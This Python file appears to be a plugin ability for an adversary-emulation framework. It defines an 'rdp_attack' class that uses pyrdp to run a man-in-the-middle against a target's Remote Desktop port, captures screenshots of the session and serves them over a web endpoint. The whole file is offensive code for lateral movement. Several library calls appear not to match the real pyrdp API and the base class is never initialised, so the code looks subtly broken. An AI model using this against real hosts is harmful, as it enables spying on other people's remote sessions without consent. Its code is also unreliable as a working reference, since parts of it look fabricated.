import os
from datetime import datetime
from app.objects.secondclass.c_link import Link
from app.objects.c_ability import Ability
from aiohttp import web
import pyrdp.mitm
from pyrdp.mitm.cli import MITMClient
from pyrdp.mitm.state import RDPMITMState

class RDPAttack(Ability):
    def __init__(self, services):
        self.name = 'rdp_attack'
        self.description = 'Perform RDP attack and capture screen'
        self.tactic = 'lateral-movement'
        self.technique_id = 'T1021.001'
        self.technique_name = 'Remote Desktop Protocol'
        self.ability_id = 'T1021.001'
        self.platforms = ['windows']
        self.executor = 'rdp'
        self.singleton = True
        self.services = services
        self.screen_dir = 'plugins/rdp_plugin/data/screens'

    async def execute(self, operation, link: Link):
        target = link.host
        target_port = 3389
        os.makedirs(self.screen_dir, exist_ok=True)
        
        state = RDPMITMState(
            target_host=target,
            target_port=target_port,
            certificate_path="plugins/rdp_plugin/data/cert.pem",
            private_key_path="plugins/rdp_plugin/data/key.pem"
        )
        
        client = MITMClient(state)
        try:
            await client.run()
            screenshot_path = os.path.join(self.screen_dir, f'{link.id}.png')
            await client.capture_screen(screenshot_path)
            return {
                'status': 'success',
                'screenshot': screenshot_path,
                'message': f'RDP attack successful against {target}:{target_port}'
            }
        except Exception as e:
            return {
                'status': 'error',
                'message': f'RDP attack failed: {str(e)}'
            }

    async def get_screen(self, request):
        agent_id = request.match_info['agent_id']
        screen_path = os.path.join(self.screen_dir, f'{agent_id}.png')
        if os.path.exists(screen_path):
            return web.FileResponse(screen_path)
        return web.Response(status=404, text='Screenshot not found')

    async def cleanup(self):
        # Implement cleanup logic here if needed
        pass

